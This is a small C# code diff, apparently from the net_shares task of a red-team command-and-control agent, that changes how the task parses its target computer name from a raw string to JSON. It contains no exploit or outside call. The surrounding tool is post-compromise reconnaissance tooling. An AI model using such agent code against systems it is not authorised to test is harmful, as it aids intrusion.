@@ -97,6 +97,12 @@ namespace Tasks
             }
         }
 
+        [DataContract]
+        public struct NetSharesParameters
+        {
+            [DataMember(Name = "computer")] public string Computer;
+        }
+
 
         public net_shares(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
         {
@@ -142,7 +148,8 @@ namespace Tasks
             return new ST.Task(() =>
             {
                 TaskResponse resp;
-                string computer = _data.Parameters.Trim();
+                NetSharesParameters parameters = _jsonSerializer.Deserialize<NetSharesParameters>(_data.Parameters);
+                string computer = parameters.Computer;
                 if (string.IsNullOrEmpty(computer))
                 {
                     computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
